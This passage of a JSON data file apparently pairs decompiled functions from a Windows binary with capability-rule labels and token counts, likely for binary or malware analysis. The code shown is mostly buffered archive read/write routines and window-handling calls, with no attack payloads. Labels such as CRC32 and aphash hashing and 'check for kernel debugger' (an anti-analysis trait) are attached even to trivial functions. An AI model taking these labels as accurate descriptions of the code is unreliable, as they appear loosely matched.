0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.00417b17(arg_8h, uVar3, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 938
    },
    "004327b6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004327b6(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = *(param_1 + 0x28);\n    if ((*(param_1 + 0x18) & 1) == 0) {\n        piVar1 = param_1 + 0x30;\n        iVar2 = *piVar1;\n        if (*(param_1 + 8) == 0) {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x38))(iVar2, iVar3 - iVar2);\n            }\n        }\n        else {\n            if (iVar3 != iVar2) {\n                (**(**(param_1 + 0x24) + 0x50))(2, iVar3 - iVar2, 0, 0);\n            }\n            (**(**(param_1 + 0x24) + 0x50))(1, *(param_1 + 0x20), piVar1, param_1 + 0x2c);\n        }\n        iVar3 = *piVar1;\n    }\n    else {\n        if (*(param_1 + 0x2c) != iVar3) {\n            iVar3 = iVar3 - *(param_1 + 0x2c);\n            (**(**(param_1 + 0x24) + 0x28))(iVar3, iVar3 >> 0x1f, 1);\n        }\n        iVar3 = *(param_1 + 0x2c);\n    }\n    *(param_1 + 0x28) = iVar3;\n    return;\n}\n",
        "token_count": 376
    },
    "0043282d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043282d(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint arg_8h_00;\n    int32_t in_stack_ffffffe4;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar6 = in_ECX;\n    if ((*(in_ECX + 0x18) & 1) != 0) goto code_r0x00432847;\n    arg_8h_00 = 4;\n    in_stack_ffffffe4 = *(in_ECX + 0x14);\n    do {\n        fcn.00435da3(arg_8h_00, in_stack_ffffffe4);\n        iVar6 = in_ECX;\ncode_r0x00432847:\n        in_ECX = in_stack_ffffffe4;\n        uVar2 = *(iVar6 + 0x28);\n        piVar1 = iVar6 + 0x2c;\n        var_4h = *piVar1 - uVar2;\n        uVar3 = arg_8h + var_4h;\n        if (*(iVar6 + 8) == 0) {\n            uVar4 = *(iVar6 + 0x30);\n            if (uVar4 < uVar2) {\n                if (0 < var_4h) {\n                    fcn.0040e880(uVar4, *piVar1 - uVar4, uVar2, var_4h);\n                    uVar4 = *(iVar6 + 0x30);\n                    *(iVar6 + 0x28) = uVar4;\n                    *piVar1 = uVar4 + var_4h;\n                }\n                if (*(iVar6 + 0xc) == 0) {\n                    arg_8h = *(iVar6 + 0x20);\n                }\n                arg_8h = arg_8h - var_4h;\n                iVar7 = var_4h + uVar4;\n                do {\n                    iVar5 = (**(**(iVar6 + 0x24) + 0x34))(iVar7, arg_8h);\n                    var_4h = var_4h + iVar5;\n                    arg_8h = arg_8h - iVar5;\n                    iVar7 = iVar7 + iVar5;\n                    if ((iVar5 == 0) || (arg_8h == 0)) break;\n                } while (var_4h < uVar3);\n                *(iVar6 + 0x28) = *(iVar6 + 0x30);\n                *piVar1 = *(iVar6 + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(iVar6 + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(iVar6 + 0x24) + 0x50))(0, *(iVar6 + 0x20), iVar6 + 0x30, piVar1);\n            *(iVar6 + 0x28) = *(iVar6 + 0x30);\n        }\n        if (uVar3 <= *piVar1 - *(iVar6 + 0x28)) {\n            return;\n        }\n        arg_8h_00 = 3;\n        in_stack_ffffffe4 = in_ECX;\n    } while( true );\n}\n",
        "token_count": 810
    },
    "0043291d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043291d(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uchar unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 1;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 196
    },
    "00432953": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432953(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 232
    },
    "00432993": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432993(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    ushort unaff_SI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 2;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = unaff_SI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 195
    },
    "004329cd": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004329cd(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 197
    },
    "00432a06": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432a06(int32_t param_1)\n\n{\n    uchar *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 1U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 1);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 1;\n    return param_1;\n}\n",
        "token_count": 193
    },
    "00432a45": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432a45(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 224
    },
    "00432a8d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432a8d(int32_t param_1)\n\n{\n    ushort *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 2U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 2);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 2;\n    return param_1;\n}\n",
        "token_count": 194
    },
    "00432ad0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432ad0(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 193
    },
    "00432d0d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432d0d(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if ((arg_ch != 0) && (arg_8h != 0)) {\n        if ((~*(in_ECX + 0x18) & 1) == 0) {\n            fcn.00435da3(2, *(in_ECX + 0x14));\n        }\n        uVar1 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        uVar2 = arg_ch;\n        if (uVar1 <= arg_ch) {\n            uVar2 = uVar1;\n        }\n        fcn.00417b17(*(in_ECX + 0x28), uVar1, arg_8h, uVar2);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar2;\n        arg_ch = arg_ch - uVar2;\n        if (arg_ch != 0) {\n            fcn.004327b6();\n            iVar3 = arg_ch - arg_ch % *(in_ECX + 0x20);\n            (**(**(in_ECX + 0x24) + 0x38))(arg_8h + uVar2, iVar3);\n            arg_ch = arg_ch - iVar3;\n            if (*(in_ECX + 8) != 0) {\n                (**(**(in_ECX + 0x24) + 0x50))(1, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n            }\n            if (arg_ch < *(in_ECX + 0x20)) goto code_r0x00432db2;\n            do {\n                fcn.0041901a();\ncode_r0x00432db2:\n            } while (*(in_ECX + 0x28) != *(in_ECX + 0x30));\n            fcn.00417b17(*(in_ECX + 0x28), arg_ch, arg_8h + uVar2 + iVar3, arg_ch);\n            *(in_ECX + 0x28) = *(in_ECX + 0x28) + arg_ch;\n        }\n    }\n    return;\n}\n",
        "token_count": 561
    },
    "00434524": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434524(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar2 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar2 && uVar2 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    puVar1 = *(param_1 + 0x28);\n    *puVar1 = unaff_ESI;\n    puVar1[1] = unaff_retaddr;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 232
    },
    "00434564": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434564(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 197
    },
    "0043459d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043459d(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 4;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = unaff_ESI;\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 198
    },
    "004345d6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.004345d6(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(2, *(param_1 + 0x14));\n    }\n    uVar1 = *(param_1 + 0x28) + 8;\n    if (*(param_1 + 0x2c) <= uVar1 && uVar1 != *(param_1 + 0x2c)) {\n        fcn.004327b6();\n    }\n    **(param_1 + 0x28) = CONCAT44(unaff_retaddr, unaff_ESI);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 227
    },
    "0043460f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043460f(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    puVar1 = *(param_1 + 0x28);\n    *unaff_ESI = *puVar1;\n    unaff_ESI[1] = puVar1[1];\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 224
    },
    "00434657": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434657(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "00434699": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00434699(int32_t param_1)\n\n{\n    ulong *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 8U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 8);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 8;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "004346db": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004346db(int32_t param_1)\n\n{\n    uint *unaff_ESI;\n    \n    if ((*(param_1 + 0x18) & 1) == 0) {\n        fcn.00435da3(4, *(param_1 + 0x14));\n    }\n    if (*(param_1 + 0x2c) < *(param_1 + 0x28) + 4U) {\n        fcn.0043282d((*(param_1 + 0x28) - *(param_1 + 0x2c)) + 4);\n    }\n    *unaff_ESI = **(param_1 + 0x28);\n    *(param_1 + 0x28) = *(param_1 + 0x28) + 4;\n    return param_1;\n}\n",
        "token_count": 192
    },
    "004348f4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x004349b6)\n\nvoid __cdecl fcn.004348f4(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t *in_ECX;\n    uint32_t uVar5;\n    bool bVar6;\n    ulong uVar7;\n    uint64_t uVar8;\n    int64_t iVar9;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uVar3 = in_ECX[2];\n    if (uVar3 != 0) {\n        *arg_8h = *in_ECX;\n        arg_8h[1] = in_ECX[1];\n        arg_8h[2] = uVar3;\n        return;\n    }\n    uVar3 = in_ECX[1];\n    uVar5 = *in_ECX;\n    if (((uVar5 | uVar3) == 0) || (arg_ch == 0)) {\n        *arg_8h = 0;\n        arg_8h[1] = 0;\n        arg_8h[2] = 0;\n        return;\n    }\n    uVar1 = arg_ch >> 0x18 ^ uVar3 >> 0x18;\n    if ((uVar3 < 1) && (uVar3 < 0)) {\n        bVar6 = uVar5 != 0;\n        uVar5 = -uVar5;\n        uVar3 = -(uVar3 + bVar6);\n    }\n    uVar4 = fcn.0045931b(arg_ch);\n    uVar7 = fcn.00458b90(uVar3, 0, uVar4, 0);\n    if ((uVar7 >> 0x20 == 0) && (uVar7 < 0x80000001)) {\n        uVar8 = fcn.00458b90(uVar5, 0, uVar4, 0);\n        iVar9 = fcn.00458b90(uVar7, 0, 0, 1);\n        uVar2 = uVar8 + iVar9;\n        if (uVar8 <= uVar2) {\n            if (uVar1 < '\\0') {\n                uVar2 = CONCAT44(-((uVar2 >> 0x20) + (uVar2 != 0)), -uVar2);\n            }\n            if (-1 < (uVar2 >> 0x20 ^ arg_ch ^ in_ECX[1])) {\n                uVar3 = 0;\n                goto code_r0x004349f2;\n            }\n        }\n    }\n    uVar3 = 1;\n    if (uVar1 < '\\0') {\n        uVar2 = 0x8000000000000000;\n    }\n    else {\n        uVar2 = 0x7fffffffffffffff;\n    }\ncode_r0x004349f2:\n    *arg_8h = uVar2;\n    arg_8h[1] = uVar2 >> 0x20;\n    arg_8h[2] = uVar3;\n    return;\n}\n",
        "token_count": 752
    },
    "004351c7": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004351c7(uint noname_0, int32_t noname_1, int32_t noname_2, uint noname_3, uint noname_4, uint noname_5, \n            uint noname_6, uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t var_8h;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if ((noname_2 != 0) && (noname_1 == 0)) {\n        fcn.0041901a();\n    }\n    if ((~*(var_8h + 0x18) & 1) == 0) {\n        for (; noname_2 != 0; noname_2 = noname_2 + -1) {\n            fcn.00434f5f(var_8h, noname_1);\n            noname_1 = noname_1 + 0x10;\n        }\n    }\n    else {\n        for (; noname_2 != 0; noname_2 = noname_2 + -1) {\n            fcn.00433e2d();\n            fcn.00434d5f(var_8h, noname_1, uStack32, uStack28, uStack24);\n            noname_1 = noname_1 + 0x10;\n        }\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "00435f3c": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00435f3c(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint *puVar3;\n    uint arg_8h;\n    uint in_stack_fffffff4;\n    \n    if (param_2 != 0) goto code_r0x00435f52;\n    in_stack_fffffff4 = *(param_1 + 0x14);\n    arg_8h = 6;\n    while( true ) {\n        fcn.00435da3(arg_8h, in_stack_fffffff4);\ncode_r0x00435f52:\n        if ((~*(param_1 + 0x18) & 1) != 0) break;\n        arg_8h = 1;\n    }\n    if (*(param_2 + 8) == 0xffff) {\n        fcn.00419000();\n    }\n    fcn.00435e43(0);\n    puVar2 = fcn.0043194f(param_2);\n    uVar1 = *puVar2;\n    if (uVar1 == 0) {\n        fcn.00432993(0xffff);\n        fcn.00432f11(param_1);\n        fcn.00435e2f();\n        puVar3 = fcn.0043194f(param_2);\n        *puVar3 = *(param_1 + 0x34);\n        *(param_1 + 0x34) = *(param_1 + 0x34) + 1;\n    }\n    else if (uVar1 < 0x7fff) {\n        fcn.00432993(uVar1 | 0x8000);\n    }\n    else {\n        fcn.00432993(0x7fff);\n        fcn.004329cd(uVar1 | 0x80000000);\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "004361c2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004361c2(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t *in_stack_fffffff8;\n    \n    if ((~*(param_1 + 0x18) & 1) == 0) {\n        in_stack_fffffff8 = *(param_1 + 0x14);\n        fcn.00435da3(2, in_stack_fffffff8);\n    }\n    fcn.00435e43(0);\n    if (in_stack_fffffff8 == NULL) {\n        fcn.00432993(0);\n    }\n    else {\n        puVar2 = fcn.0043194f(in_stack_fffffff8);\n        uVar1 = *puVar2;\n        if (uVar1 == 0) {\n            uVar3 = (***in_stack_fffffff8)();\n            fcn.00435f3c(uVar3);\n            fcn.00435e2f();\n            puVar4 = fcn.0043194f(in_stack_fffffff8);\n            *puVar4 = *(param_1 + 0x34);\n            *(param_1 + 0x34) = *(param_1 + 0x34) + 1;\n            (**(*in_stack_fffffff8 + 8))(param_1);\n        }\n        else if (uVar1 < 0x7fff) {\n            fcn.00432993(uVar1);\n        }\n        else {\n            fcn.00432993(0x7fff);\n            fcn.004329cd(uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "00436b22": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __thiscall fcn.00436b22(uint *param_1, uint8_t param_2)\n\n{\n    uint *puVar1;\n    \n    if ((param_2 & 2) == 0) {\n        fcn.004010d0();\n        puVar1 = param_1;\n        if ((param_2 & 1) != 0) {\n            fcn.004170df(param_1);\n        }\n    }\n    else {\n        puVar1 = param_1 + -1;\n        fcn.0045d105(param_1, 4, *puVar1, fcn.00401900);\n        if ((param_2 & 1) != 0) {\n            fcn.004170df(puVar1);\n        }\n    }\n    return puVar1;\n}\n",
        "token_count": 178
    },
    "0043c9ee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043c9ee(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint *extraout_ECX;\n    uint *puVar2;\n    \n    if ((*(in_ECX + 0x70) & 0x1000) != 0) {\n        if ((*(in_ECX + 0x6c) & 1) != (arg_8h != NULL)) {\n            arg_8h = NULL;\n            *(in_ECX + 0x6c) = *(in_ECX + 0x6c) ^ 1;\n            puVar2 = *(in_ECX + 0x50);\n            if (puVar2 == NULL) {\n                fcn.0041901a();\n                puVar2 = extraout_ECX;\n            }\n            iVar1 = (***puVar2)(puVar2, 0x496794, &arg_8h);\n            if (-1 < iVar1) {\n                (**(*arg_8h + 0x14))(arg_8h, 0xfffffd37);\n                (**(*arg_8h + 8))(arg_8h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 273
    },
    "0043df15": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0043df15(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, int32_t arg_28h, int32_t arg_2ch, uint arg_30h)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    \n    iVar1 = 0;\n    if (arg_8h == NULL) {\n        arg_8h = fcn.00401070(0x80004005);\n        iVar1 = extraout_ECX;\n    }\n    *(arg_8h + 0xc) = arg_10h;\n    *(arg_8h + 0x32) = arg_18h;\n    arg_8h[8] = (arg_10h & 0xffff) >> 0xe & 1;\n    *(arg_8h + 0x33) = arg_1ch;\n    arg_8h[5] = arg_30h;\n    arg_8h[1] = arg_24h;\n    arg_8h[9] = arg_20h;\n    arg_8h[10] = arg_14h;\n    *arg_8h = arg_ch;\n    arg_8h[0xb] = iVar1;\n    arg_8h[2] = iVar1;\n    arg_8h[3] = iVar1;\n    arg_8h[4] = iVar1;\n    arg_8h[6] = iVar1;\n    arg_8h[7] = 1;\n    if (arg_28h != iVar1) {\n        arg_8h[7] = 3;\n        arg_8h[2] = arg_28h;\n    }\n    if (arg_2ch != iVar1) {\n        arg_8h[7] = arg_8h[7] | 4;\n        arg_8h[3] = arg_2ch;\n    }\n    return;\n}\n",
        "token_count": 461
    },
    "004430be": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.004430be(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == 0) {\n        return param_1;\n    }\n    iVar1 = *(param_1 + 0x50);\n    if (iVar1 != 0) {\n        if ((*(iVar1 + 0x70) & 0x1000) != 0) {\n            return (-((*(iVar1 + 0x6c) & 1) != 0) & 0xfffffff0) + 0x20;\n        }\n        return 0;\n    }\n    uVar2 = fcn.00442fc8(param_1, 0);\n    return uVar2 & 0x30;\n}\n",
        "token_count": 176
    },
    "004460a2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004460a2(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar3 = fcn.004225b8();\n    iVar4 = param_1;\n    if ((uVar3 & 0x40000000) == 0) {\n        iVar4 = fcn.0041f23b();\n    }\n    if (iVar4 == 0) {\n        fcn.0041901a();\n    }\n    pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n    if ((param_2 & 0xc) != 0) {\n        iVar5 = fcn.0042271e();\n        if ((((~(param_2 >> 3) & 1) == 0) || (iVar5 == 0)) || (iVar4 == param_1)) {\n            (*pcVar2)(*(iVar4 + 0x20), 0x86, 0, 0);\n        }\n        else {\n            *(param_1 + 0x3c) = *(param_1 + 0x3c) | 0x200;\n            (*pcVar2)(*(iVar4 + 0x20), 0x86, 1, 0);\n            *(param_1 + 0x3c) = *(param_1 + 0x3c) & 0xfffffdff;\n        }\n    }\n    uVar7 = 5;\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(5);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    while (iVar5 = (*pcVar1)(iVar5, uVar7),  iVar5 != 0) {\n        iVar6 = fcn.0044569f(*(iVar4 + 0x20), iVar5);\n        if (iVar6 != 0) {\n            